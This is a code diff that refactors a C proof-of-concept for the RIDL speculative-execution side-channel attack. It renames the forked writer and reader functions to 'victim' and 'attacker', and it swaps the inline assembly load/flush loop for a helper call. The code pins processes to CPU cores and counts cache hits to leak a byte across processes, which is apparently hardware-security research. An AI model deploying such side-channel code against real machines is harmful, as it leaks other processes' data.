@@ -1,37 +1,28 @@
 #include "../primitives/basic_primitives.h"
-#include <time.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
-#include <pthread.h>
-#include <sched.h>
 #include <signal.h>
 #include <sys/mman.h>
+#include "utils.h"
+
 
 
 #define REPS 200000
 #define WRITE_VALUE 42ull
-int _page_size = 0x1000;
 
 int writer_cpu = 3, reader_cpu = 7, pid = 0;
 int hits[256];
 
-inline void *test_write(uint64_t value) {
+inline void *victim(uint64_t value) {
     set_processor_affinity(writer_cpu);
     uint64_t *destination = aligned_alloc(_page_size, _page_size);
     destination[0] = value;
-    asm volatile(
-    "ridl_victim_loop:\n"
-    "movq (%0), %%rbx\n"
-    "xor %%rbx, %%rbx\n"
-    "mfence\n"
-    "clflush (%0)\n"
-    "jmp ridl_victim_loop"
-    ::"r"(destination));
+    while (1) { load_and_flush(destination); }
 }
 
-void test_read(void *mem) {
+void attacker(void *mem) {
     set_processor_affinity(reader_cpu);
     memset(hits, 0, sizeof(hits[0]) * 256);
     int reps = REPS;
@@ -54,9 +45,9 @@ int main() {
     memset(mem, 0xFF, _page_size * 256);
     ridl_init();
     pid = fork();
-    if (!pid) test_write(WRITE_VALUE);
+    if (!pid) victim(WRITE_VALUE);
     usleep(10000);
-    test_read(mem);
+    attacker(mem);
     int max = -1, max_i = -1;
     for (int i = 1; i < 256; i++) {
         if (hits[i] > max) {
